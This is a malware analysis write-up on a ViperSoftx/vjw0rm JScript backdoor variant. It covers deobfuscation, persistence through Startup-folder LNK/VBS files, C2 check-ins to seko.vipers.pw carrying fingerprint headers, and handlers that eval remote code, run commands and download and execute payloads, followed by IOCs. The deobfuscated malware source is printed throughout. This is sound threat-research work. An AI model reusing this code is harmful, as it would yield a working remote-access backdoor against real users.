# ViperSoftx Vjw0rm Variant


## Situation:

While watching [Any.Run](https://any.run) for interesting scripts to deobfuscate, I noted that its traffic did appear to be like other variants of `vjw0rm` however wasn't sure of what else it could do.

## Metadata:

- Sample: `3236312b9dc691dd8b9214f08ff01e5d`

## Analysis

The obfuscation techniques are pretty standard, the first stage deobfuscates base64 data then performs mathematic operations on it (I don't give a crap how they work I just let it do the heavy lifting for me), interestingly the base64 string is reversed.

After this then the obfuscation consistently used `eval` which is easily replaced with `console.log` and ran using `nodejs` to dump the next stages.

It took approximatly twenty different times dumping the obfuscated code before I was able to access the deobfuscated code.


The script starts with setting up some global variables the script needs to run then makes a call to `ModinySks()`, this function is responsible to establishing persistence.

```js
var shell = new ActiveXObject('WScript.Shell');
var fstym = new ActiveXObject('Scripting.FileSystemObject');
var spl = '|V|';
var Ch = '\\';
var verss = 'viperSoftx_1.0.7.6';
var VN = verss + '_' + getSerial();
var Startup = getEnv('appdata') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\';
var StartupAll = getEnv('allusersprofile') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\';
var Temp = getEnv('temp') + '\\';
var Desktop = getEnv('userProfile') + '\\Desktop\\';
var AppData = getEnv('appdata') + '\\';
var fxDmE4zu = WScript.ScriptFullName;
var wn = WScript.ScriptName;
var UDex;
var DeLay = 20;
var ps = 'powershell.exe';
var batf = AppData + wn + '.bat';
var vbsf = AppData + wn + '.vbs';
var lnkf = Startup + wn + '.lnk';
ModinySks();
```

We can see that `powershell.exe` is used to copy, the backdoor script to the `%AppData%` folder then establishing persistence in the startup folder as a `LNK` file.

```js
function ModinySks() {
	try {
		shell.Run(ps + " Copy-Item -Path '" + fxDmE4zu + "' -Destination '" + AppData + wn + "'", 0, false);
		var newpato = 'start wscript.exe /E:jscript """' + AppData + wn + '"""';
		CreateFile(vbsf, 'Set WshShell = WScript.CreateObject("""WScript.Shell""")' + '\n' + 'obj = WshShell.Run("""wscript.exe /E:jscript """"""' + AppData + wn + '""""""""", 0)' + '\n' + 'set WshShell = Nothing');
		createShort(lnkf, vbsf);
	} catch (err) {
	}
}
```

After persistence is achieved, it will checkin to the C2 server `seko[.]vipers[.]pw:8880`, send fingerprinting data in the `User-Agent`.

Interestingly, this variant adds the `X-Header` HTTP header with the variant prefix / version as well.

```js
function SendHttp(R) {
	var X = new ActiveXObject('Microsoft.XMLHTTP');
	X.open('put', 'http://seko.vipers.pw:8880/connect', false);
	var useragent = getUserAgent();
	X.SetRequestHeader('User-Agent:', useragent);
	X.SetRequestHeader('X-Header:', VN);
	X.send(R);
	return X.responsetext;
}
```

The C2 server response body will be parsed by use of the delimiter `|V|` much like previous variants.

```js
var send = SendHttp();
var Command = send.split(spl);
var order = Command[0];
var order_data = Command[1];
```

### C2 Command (Ex):

Code:
```js
if (order === 'Ex') {
	eval(order_data);
}
```
Command from C2: `Ex|V|<jscript_code>`

### C2 Command (Cmd):

Code:
```js
if (order === 'Cmd') {
	shell.Run(order_data, 0, false);
}
```

Command from C2: `Cmd|V|whoami`

### C2 Command (DwnlExe):

Code:
```js
if (order === 'DwnlExe') {
	var path = Temp + Command[2];
	DownFile(Command[1], path, true);
	WScript.Sleep(DeLay * 1000);
	shell.Run("cmd.exe start '" + path + "'", 0, false);
}
```

Command from C2: `DwnlExe|V|<url>|V|<path>`

### C2 Command (DwnlOnly):

Code:
```js
if (order === 'DwnlOnly') {
	varpathdwn = '';
	var path = Command[3];
	var exe = Command[4];
	if (path == 'startup') {
		pathdwn = Startup + Command[2];
	} else if (path == 'temp') {
		pathdwn = Temp + Command[2];
	} else if (path == 'desktop') {
		pathdwn = Desktop + Command[2];
	} else {
		pathdwn = path + Command[2];
	}
	if (pathdwn != '') {
		if (exe == 'yes') {
			DownFile(Command[1], pathdwn, true);
			WScript.Sleep(DeLay * 1000);
			shell.Run(ps + " start '" + pathdwn + "'", 0, false);
		} else {
			DownFile(Command[1], pathdwn, false);
		}
	}
}
```

### C2 Command (SelfRemove):

Code:
```js
if (order === 'SelfRemove') {
	UnMonkSek(true);
}
```

### C2 Comamnd (UpdateS):

```js
if (order === 'UpdateS') {
	var path = Temp + Command[2];
	DownFile(Command[1], path, true);
	if (fstym.fileexists(path)) {
		UnMonkSek(false);
		WScript.Sleep(DeLay * 1000);
		shell.Run(ps + " start wscript.exe /E:jscript '" + path + "'", 0, false);
		WScript.Quit(1);
	}
}
```

Command from C2: `UpdateS|V|<url>|V|<tmp_file_name>`

### C2 Checkin Traffic:

```http
PUT /connect HTTP/1.1
Accept: */*
Accept-Language: en-us
User-Agent: viperSoftx_1.0.7.6_C4BA3647\USER-PC\Admin\Microsoft Windows 7 Professional [32]\\YES\undefined\
x-header: viperSoftx_1.0.7.6_C4BA3647
Accept-Encoding: gzip, deflate
Host: seko.vipers.pw:8880
Content-Length: 0
Connection: Keep-Alive
Cache-Control: no-cache
```

If you look closely the difference are the use of the `PUT` HTTP method and the use of the `x-header`.

This is easy enough to create detection for.

## IOCS:

```txt
3236312b9dc691dd8b9214f08ff01e5d
seko.vipers.pw
```

## References:
- [Deobfuscated Samples](/samples/2020-02-10-vipersoftx.zip)
- [Any.Run](https://app.any.run/tasks/e97fabaa-96ca-4377-b0ee-2344d1c11291/)
- [VirusTotal](https://www.virustotal.com/gui/file/ad5e9d005b764ba80b93c31bec1814ee43ac13143ca67d795a05ae7dbe9cf72f/detection)

